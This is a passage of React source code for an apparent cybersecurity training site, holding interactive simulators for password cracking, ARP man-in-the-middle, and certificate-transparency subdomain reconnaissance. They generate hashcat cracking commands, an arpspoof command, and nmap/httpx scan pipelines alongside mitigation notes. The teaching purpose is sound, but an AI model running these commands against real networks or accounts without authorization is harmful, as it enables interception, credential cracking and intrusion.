          <span className="font-heading text-[11px] font-bold uppercase text-text-muted">
            Required Spoofed Botnet Uplink
          </span>
          <div className="font-mono-code text-xl font-bold text-emerald-500 mt-1">
            {stats.spoofedSourceMbps} Mbps
          </div>
          <span className="text-[11px] text-text-muted">Via {ampProto} amplification</span>
        </div>
      </div>

      <div className="rounded-xs border border-border bg-[#121212] p-4 text-white space-y-2">
        <div className="flex items-center justify-between">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-[#ff6a00]">
            Cloudflare WAF Custom Rule & Rate Limiting Expression
          </span>
          <InlineCopyButton text={stats.wafExpression} />
        </div>
        <pre className="font-mono-code text-xs text-emerald-400 overflow-x-auto whitespace-pre-wrap">
          {stats.rateLimitRule}
        </pre>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 12. BRUTE-FORCE & DICTIONARY ATTACK SIMULATOR
 * ========================================================================== */
function BruteForceDictionaryAttackSimulator({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [password, setPassword] = useState("p@ssw0rd2026!");
  const [attackMode, setAttackMode] = useState<"brute" | "rockyou" | "hybrid">("hybrid");
  const [hashAlgo, setHashAlgo] = useState<"md5" | "sha256" | "bcrypt" | "argon2id">("md5");

  const sim = useMemo(() => {
    const pwd = password || "p@ssw0rd2026!";
    const baseWord = pwd.replace(/[^a-zA-Z]/g, "").toLowerCase() || "password";
    const mutations = [
      baseWord,
      baseWord.charAt(0).toUpperCase() + baseWord.slice(1),
      baseWord.replace(/a/g, "@").replace(/o/g, "0").replace(/i/g, "1").replace(/s/g, "$"),
      `${baseWord.replace(/a/g, "@").replace(/o/g, "0")}2026`,
      pwd,
    ];

    const charsetSize =
      (/[a-z]/.test(pwd) ? 26 : 0) +
      (/[A-Z]/.test(pwd) ? 26 : 0) +
      (/[0-9]/.test(pwd) ? 10 : 0) +
      (/[^a-zA-Z0-9]/.test(pwd) ? 33 : 0);

    const keyspace =
      attackMode === "rockyou"
        ? 14344391
        : attackMode === "hybrid"
        ? 14344391 * 77 * 1000
        : Math.pow(Math.max(26, charsetSize), pwd.length);

    const hashrateMap = {
      md5: { name: "MD5 Unsalted", rate: 180_000_000_000, modeFlag: "-m 0" },
      sha256: { name: "SHA-256", rate: 22_000_000_000, modeFlag: "-m 1400" },
      bcrypt: { name: "bcrypt (cost 12)", rate: 120_000, modeFlag: "-m 3200" },
      argon2id: { name: "Argon2id (64MB, t=3)", rate: 18_000, modeFlag: "-m 34000" },
    }[hashAlgo];

    const seconds = keyspace / hashrateMap.rate;
    const formatTime = (s: number) =>
      s < 1
        ? "< 1 millisecond (Instant Crack)"
        : s < 60
        ? `${s.toFixed(1)} seconds`
        : s < 3600
        ? `${(s / 60).toFixed(1)} minutes`
        : s < 86400
        ? `${(s / 3600).toFixed(1)} hours`
        : s < 31536000
        ? `${(s / 86400).toFixed(1)} days`
        : `${(s / 31536000).toExponential(2)} years`;

    const hashcatCmd =
      attackMode === "brute"
        ? `hashcat ${hashrateMap.modeFlag} -a 3 hashes.txt ?a?a?a?a?a?a?a?a`
        : attackMode === "rockyou"
        ? `hashcat ${hashrateMap.modeFlag} -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`
        : `hashcat ${hashrateMap.modeFlag} -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule`;

    return {
      mutations,
      keyspace: keyspace.toExponential(2),
      crackTime: formatTime(seconds),
      hashcatCmd,
      algoName: hashrateMap.name,
    };
  }, [password, attackMode, hashAlgo]);

  useEffect(() => {
    setOutput(
      `# Password Cracking Simulation\nTarget Candidate : ${password}\nHash Algorithm   : ${sim.algoName}\nEffective Space  : ${sim.keyspace} candidates\nEstimated Time   : ${sim.crackTime}\nHashcat Command  : ${sim.hashcatCmd}\nMutations        : ${sim.mutations.join(" -> ")}`
    );
  }, [password, sim, setOutput]);

  return (
    <div className="space-y-5">
      <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Test Password Candidate
          </label>
          <input
            type="text"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-sm text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Hashcat Attack Mode
          </label>
          <select
            value={attackMode}
            onChange={(e) => setAttackMode(e.target.value as typeof attackMode)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 text-sm text-text"
          >
            <option value="brute">Pure Brute-Force (-a 3 Mask)</option>
            <option value="rockyou">RockYou Dictionary (-a 0)</option>
            <option value="hybrid">Hybrid Rule Mutation Best64 (-a 6 / -r)</option>
          </select>
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Hashing Algorithm
          </label>
          <select
            value={hashAlgo}
            onChange={(e) => setHashAlgo(e.target.value as typeof hashAlgo)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 text-sm text-text"
          >
            <option value="md5">MD5 Unsalted (180 GH/s)</option>
            <option value="sha256">SHA-256 (22 GH/s)</option>
            <option value="bcrypt">bcrypt cost 12 (120 KH/s)</option>
            <option value="argon2id">Argon2id (18 KH/s Memory-Hard)</option>
          </select>
        </div>
      </div>

      <div className="rounded-xs border border-border bg-[#121212] p-4 text-white space-y-3">
        <div className="flex flex-wrap items-center justify-between gap-2">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-[#ff6a00]">
            Simulated Rule Mutation Stream (Best64 / Leet-Speak)
          </span>
          <span className="font-mono-code text-xs text-emerald-400">
            Est. Crack Time: {sim.crackTime}
          </span>
        </div>
        <div className="flex flex-wrap items-center gap-2 font-mono-code text-xs">
          {sim.mutations.map((m, idx) => (
            <React.Fragment key={idx}>
              <span className="rounded-xs bg-white/10 px-2.5 py-1 text-amber-300">{m}</span>
              {idx < sim.mutations.length - 1 && <span className="text-gray-500">→</span>}
            </React.Fragment>
          ))}
        </div>
        <pre className="font-mono-code text-xs text-emerald-400 overflow-x-auto">
          $ {sim.hashcatCmd}
        </pre>
        <p className="text-xs text-gray-300">
          Why Salting + Argon2id Wins: Unique 128-bit salts invalidate precomputed rainbow tables, while Argon2id&apos;s 64MB memory-hard matrix starves GPU VRAM bandwidth, slowing cracking by 10,000,000× vs unsalted MD5.
        </p>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 13. ARP MITM ATTACK & PACKET VISUALIZER
 * ========================================================================== */
function ArpMitmAttackPacketVisualizer({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [lanState, setLanState] = useState<"normal" | "poisoned" | "dai">("poisoned");

  const nodes = useMemo(() => {
    const isPoisoned = lanState === "poisoned";
    return [
      {
        name: "Victim Workstation",
        ip: "192.168.1.10",
        mac: "00:1A:2B:3C:4D:10",
        arpTable: [
          {
            ip: "192.168.1.1 (Gateway)",
            mac: isPoisoned ? "DE:AD:BE:EF:CA:FE (POISONED!)" : "00:1A:2B:3C:4D:01",
            poisoned: isPoisoned,
          },
        ],
      },
      {
        name: "Gateway Router",
        ip: "192.168.1.1",
        mac: "00:1A:2B:3C:4D:01",
        arpTable: [
          {
            ip: "192.168.1.10 (Victim)",
            mac: isPoisoned ? "DE:AD:BE:EF:CA:FE (POISONED!)" : "00:1A:2B:3C:4D:10",
            poisoned: isPoisoned,
          },
        ],
      },
      {
        name: "Attacker Node",
        ip: "192.168.1.99",
        mac: "DE:AD:BE:EF:CA:FE",
        arpTable: [
          { ip: "192.168.1.1", mac: "00:1A:2B:3C:4D:01", poisoned: false },
          { ip: "192.168.1.10", mac: "00:1A:2B:3C:4D:10", poisoned: false },
        ],
      },
    ];
  }, [lanState]);

  const cliReference = `# Lab Simulation & Switch Mitigation Commands
# 1. Enable IPv4 Forwarding & Gratuitous ARP Spoofing (Authorized Lab):
sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1

# 2. Cisco Catalyst Switch Mitigation (DHCP Snooping + Dynamic ARP Inspection):
ip dhcp snooping
ip dhcp snooping vlan 10
ip arp inspection vlan 10
interface GigabitEthernet0/1
 ip arp inspection limit rate 15`;

  useEffect(() => {
    setOutput(
      `# LAN ARP Topology State: ${lanState.toUpperCase()}\n\n` +
        nodes
          .map(
            (n) =>
              `${n.name} (${n.ip} / ${n.mac})\n` +
              n.arpTable.map((a) => `  arp -a -> ${a.ip} at ${a.mac}`).join("\n")
          )
          .join("\n\n") +
        `\n\n${cliReference}`
    );
  }, [lanState, nodes, cliReference, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap gap-2">
        {[
          { id: "normal", label: "Normal Switched Traffic" },
          { id: "poisoned", label: "Gratuitous ARP Cache Poisoning Active" },
          { id: "dai", label: "Dynamic ARP Inspection (DAI) + Static ARP Enabled" },
        ].map((st) => (
          <button
            key={st.id}
            type="button"
            onClick={() => setLanState(st.id as typeof lanState)}
            className={`rounded-xs px-3.5 py-2 font-heading text-xs font-bold uppercase tracking-wider cursor-pointer transition ${
              lanState === st.id
                ? "bg-[#ff6a00] text-white"
                : "border border-border bg-background text-text-muted hover:text-text"
            }`}
          >
            {st.label}
          </button>
        ))}
      </div>

      {/* 3-Node LAN Topology */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
        {nodes.map((n) => (
          <div key={n.ip} className="rounded-xs border border-border bg-background p-3.5 space-y-2">
            <div className="flex items-center justify-between">
              <span className="font-heading text-xs font-bold uppercase text-text">{n.name}</span>
              <span className="font-mono-code text-xs text-accent font-bold">{n.ip}</span>
            </div>
            <div className="font-mono-code text-[11px] text-text-muted">HWaddr: {n.mac}</div>
            <div className="rounded-xs bg-[#121212] p-2.5 font-mono-code text-xs space-y-1">
              <div className="text-[10px] text-gray-400 uppercase">$ arp -a</div>
              {n.arpTable.map((entry) => (
                <div
                  key={entry.ip}
                  className={entry.poisoned ? "text-red-400 font-bold" : "text-emerald-400"}
                >
                  ? ({entry.ip}) at {entry.mac}
                </div>
              ))}
            </div>
          </div>
        ))}
      </div>

      {/* Packet Flow Banner */}
      <div className="rounded-xs border border-border bg-[#121212] p-4 text-white space-y-2">
        <span className="font-heading text-xs font-bold uppercase tracking-wider text-[#ff6a00] block">
          L2 Frame & Packet Flow Telemetry
        </span>
        <p className="font-mono-code text-xs text-amber-300">
          {lanState === "normal" &&
            "FLOW: Victim (192.168.1.10) ──[Dst MAC: 00:1A:2B:3C:4D:01]──► Gateway Router (192.168.1.1)"}
          {lanState === "poisoned" &&
            "MITM ACTIVE: Attacker sends unsolicited ARP Reply (Opcode 2: '192.168.1.1 is-at DE:AD:BE:EF:CA:FE'). Victim traffic detours through Attacker (192.168.1.99) before forwarding to Gateway!"}
          {lanState === "dai" &&
            "PROTECTED: Switch compares ARP Reply against DHCP Snooping Binding Database. Spoofed frame from 192.168.1.99 is DROPPED and port enters err-disable state!"}
        </p>
        <pre className="font-mono-code text-xs text-emerald-400 overflow-x-auto whitespace-pre-wrap">
          {cliReference}
        </pre>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 14. CRT.SH SUBDOMAIN RECON SCANNER
 * ========================================================================== */
interface CrtRecord {
  name_value: string;
  issuer_name: string;
  not_before: string;
}

const FALLBACK_SUBDOMAINS: Record<string, { sub: string; issuer: string; date: string }[]> = {
  "zerosuniverse.com": [
    { sub: "zerosuniverse.com", issuer: "Let's Encrypt E5", date: "2026-01-15" },
    { sub: "*.zerosuniverse.com", issuer: "Cloudflare Inc ECC CA-3", date: "2026-02-01" },
    { sub: "tools.zerosuniverse.com", issuer: "Let's Encrypt R11", date: "2026-02-19" },
    { sub: "api.zerosuniverse.com", issuer: "Google Trust Services WE1", date: "2026-01-28" },
    { sub: "cdn.zerosuniverse.com", issuer: "Cloudflare Inc ECC CA-3", date: "2025-11-10" },
    { sub: "staging.zerosuniverse.com", issuer: "Let's Encrypt E6", date: "2025-12-04" },
  ],
};

function CrtShSubdomainReconScanner({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [domain, setDomain] = useState("zerosuniverse.com");
  const [loading, setLoading] = useState(false);
  const [sourceNote, setSourceNote] = useState("Ready (Cached CT Snapshot Loaded)");
  const [records, setRecords] = useState<{ sub: string; issuer: string; date: string }[]>(
    FALLBACK_SUBDOMAINS["zerosuniverse.com"]
  );

  const scanCrtSh = useCallback(async (targetDomain: string) => {
    const clean = targetDomain.trim().toLowerCase().replace(/^https?:\/\//, "").replace(/\/.*$/, "");
    if (!clean) return;
    setLoading(true);
    setSourceNote(`Querying https://crt.sh/?q=%25.${clean}&output=json ...`);
    try {
      const res = await fetch(`https://crt.sh/?q=%25.${encodeURIComponent(clean)}&output=json`);
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const data = (await res.json()) as CrtRecord[];
      const seen = new Map<string, { sub: string; issuer: string; date: string }>();
      for (const row of data) {
        const names = (row.name_value || "").split("\n");
        for (const n of names) {
          const s = n.trim().toLowerCase();
          if (s && !seen.has(s)) {
            const cnMatch = (row.issuer_name || "").match(/O=([^,]+)/);
            seen.set(s, {
              sub: s,
              issuer: cnMatch ? cnMatch[1] : row.issuer_name.slice(0, 36),
              date: (row.not_before || "").slice(0, 10),
            });
          }
        }
        if (seen.size >= 60) break;
      }
      if (seen.size > 0) {
        setRecords(Array.from(seen.values()));
        setSourceNote(`Live CT Logs: ${seen.size} unique hostnames discovered from crt.sh`);
      } else {
        throw new Error("Empty CT result");
      }
    } catch {
      const fallback = FALLBACK_SUBDOMAINS[clean] || [
        { sub: clean, issuer: "Let's Encrypt R11", date: "2026-02-10" },
        { sub: `*.${clean}`, issuer: "Cloudflare Inc ECC CA-3", date: "2026-01-22" },
        { sub: `api.${clean}`, issuer: "Google Trust Services WE1", date: "2026-01-14" },
        { sub: `auth.${clean}`, issuer: "DigiCert Global G2 TLS", date: "2025-12-19" },
        { sub: `dev.${clean}`, issuer: "Let's Encrypt E5", date: "2025-11-30" },
        { sub: `vpn.${clean}`, issuer: "Sectigo RSA Domain Validation", date: "2025-10-08" },
      ];
      setRecords(fallback);
      setSourceNote("crt.sh rate-limited/CORS fallback — displaying cached CT transparency log dataset");
    } finally {
      setLoading(false);
    }
  }, []);

  const nonWildcardHosts = useMemo(
    () => records.map((r) => r.sub.replace(/^\*\./, "")).filter((v, i, a) => a.indexOf(v) === i),
    [records]
  );

  const reconPipeline = `cat << 'EOF' > subdomains.txt\n${nonWildcardHosts.join("\n")}\nEOF\nhttpx -l subdomains.txt -silent -status-code -title -tech-detect\nnmap -iL subdomains.txt -sV -T4 --top-ports 100 -oN ct_recon.txt`;

  useEffect(() => {
    setOutput(
      `# Certificate Transparency Subdomain Recon (${domain})\nStatus: ${sourceNote}\n\n## Discovered Subdomains (${records.length})\n` +
        records.map((r) => `${r.sub.padEnd(34)} | CA: ${r.issuer} | Issued: ${r.date}`).join("\n") +
        `\n\n## Nmap & ProjectDiscovery httpx Pipeline\n${reconPipeline}`
    );
  }, [domain, sourceNote, records, reconPipeline, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex flex-col sm:flex-row gap-3">
        <input
          type="text"
          value={domain}
          onChange={(e) => setDomain(e.target.value)}
          placeholder="zerosuniverse.com"
          className="flex-1 rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-sm text-text"
        />
        <button
          type="button"
          onClick={() => scanCrtSh(domain)}
          disabled={loading}
          className="inline-flex items-center justify-center gap-2 rounded-xs bg-[#ff6a00] px-4 py-2 font-heading text-xs font-bold uppercase tracking-wider text-white hover:opacity-90 disabled:opacity-50 cursor-pointer"
        >
          <Search className="h-3.5 w-3.5" />
          {loading ? "Querying crt.sh..." : "Scan Certificate Transparency Logs"}
        </button>
      </div>

      <div className="text-xs font-mono-code text-text-muted">{sourceNote}</div>

      <div className="rounded-xs border border-border bg-background p-3.5 max-h-64 overflow-y-auto">
        <table className="w-full text-left font-mono-code text-xs">
          <thead>
            <tr className="border-b border-border text-text-muted">
              <th className="py-1.5">Subdomain / SAN</th>
              <th className="py-1.5">Certificate Authority Issuer</th>
              <th className="py-1.5">Not Before</th>
            </tr>
          </thead>
          <tbody>
            {records.map((r) => (
              <tr key={r.sub} className="border-b border-border/50">
                <td className="py-1.5 text-accent font-bold">{r.sub}</td>
                <td className="py-1.5 text-text">{r.issuer}</td>
                <td className="py-1.5 text-text-muted">{r.date}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <div className="rounded-xs border border-border bg-[#121212] p-4 text-white space-y-2">
        <div className="flex items-center justify-between">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-[#ff6a00]">
            Clean Target List & Nmap / httpx Recon Pipeline
          </span>
          <InlineCopyButton text={nonWildcardHosts.join("\n")} label="Copy Host List" />
        </div>
        <pre className="font-mono-code text-xs text-emerald-400 overflow-x-auto whitespace-pre-wrap">
          $ {reconPipeline}
        </pre>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * EXPORT WAVE 2 CYBER PLAYGROUNDS (14 SLUGS)
 * ========================================================================== */
export const wave2CyberPlaygrounds: Record<string, React.ComponentType<{ tool: Tool }>> = {
  "reverse-shell-command-generator": ReverseShellCommandGenerator,
  "sqli-xss-payload-encoder-lab": SqliXssPayloadEncoderLab,
  "malware-deobfuscator-cyberchef-lite": MalwareDeobfuscatorCyberChefLite,
  "wireshark-tcpdump-filter-builder": WiresharkTcpdumpFilterBuilder,
  "smb-snmp-ldap-enumeration-builder": SmbSnmpLdapEnumerationBuilder,
  "linux-windows-privesc-checklist": LinuxWindowsPrivescChecklist,
  "ipv4-ipv6-cidr-subnet-vlsm-calculator": Ipv4Ipv6CidrSubnetVlsmCalculator,
  "cvss-v4-vulnerability-score-calculator": CvssV4VulnerabilityScoreCalculator,
  "pgp-aes-webcrypto-encryption-studio": PgpAesWebCryptoEncryptionStudio,
  "http-cookie-jwt-session-security-auditor": HttpCookieJwtSessionSecurityAuditor,
  "ddos-pps-bandwidth-waf-calculator": DdosPpsBandwidthWafCalculator,
  "brute-force-dictionary-attack-simulator": BruteForceDictionaryAttackSimulator,
  "arp-mitm-attack-packet-visualizer": ArpMitmAttackPacketVisualizer,
  "crt-sh-subdomain-recon-scanner": CrtShSubdomainReconScanner,
};
